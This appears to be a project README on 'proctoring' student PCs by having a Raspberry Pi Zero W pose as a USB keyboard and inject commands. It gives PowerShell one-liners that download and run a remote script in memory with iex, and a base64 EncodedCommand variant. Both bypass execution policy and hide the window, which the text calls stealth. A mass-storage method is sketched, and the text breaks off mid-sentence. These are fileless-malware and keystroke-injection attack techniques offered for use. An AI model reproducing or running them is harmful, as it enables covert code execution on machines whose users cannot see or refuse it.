# 1. Fileless Execution

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

Using the Raspberry Pi Zero W, HID mode, keystroke can be sent to execute "Run". Following which, additional keystrokes command can be sent from the examples below to conduct proctoring.  

With the Fileless Execution method, we do not need to copy any external binary executable/scripts to be able to conduct proctoring. Instead we utilize a Windows built-in software Powershell, to download additional scripts and run them purely in memory. 

Reference materials:
- https://www.mcafee.com/enterprise/en-us/assets/solution-briefs/sb-fileless-malware-execution.pdf
- https://www.varonis.com/blog/fileless-malware
- https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-

## 1.1. Utilizing DownloadString and Invoke-Expression Parameters
```
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
```
Executing the above allow us conduct proctoring directly in to the memory of the Student's PC.  
This is possible because of two Powershell command 
- "DownloadString" where it does not download any file to disk but copies content of the remote file. 
- "Invoke-Expression a.k.a iex" where it runs specified string as a command.

## 1.2. Utilizing EncodedCommand Parameters
To do this we must first, encode our script into base64 using the script below and taking note of the encoded string
```
$command = '<the whole script>'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
write-host $encodedCommand
```
After we know the encoded string, runnning the command below will allow us to conduct proctoring without needing to drop any files into the student's PC. In this case, we would not even need to have a remote script stored anywhere.
```
powershell.exe -executionpolicy bypass -w hidden -e <base64encodedstring>
```
The EncodedCommand a.k.a -e, will read the following given as a base64 string and proceed to execute it 

## 1.3 Additional Parameters
- WindowStyle (-w) hidden: This makes the Powershell operation stealth by hiding the program window away from the user
- Exec Bypass: bypass/ignore the execution policy like _Restricted_ which restricts the PS command from running
- Noprofile (-nop): Ignore the commands in the Profile file

# 2. Mass Storage 

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

In this method we utilize the Mass storage mode and HID mode of the composite Pi.  
1. We will be placing in the backing store (storage) created in the Pi. 
2. Once the Pi is connected, the script will be visible in the Student's PC 
3. From there, we can send in keystrokes using the HID mode to execute the script from 
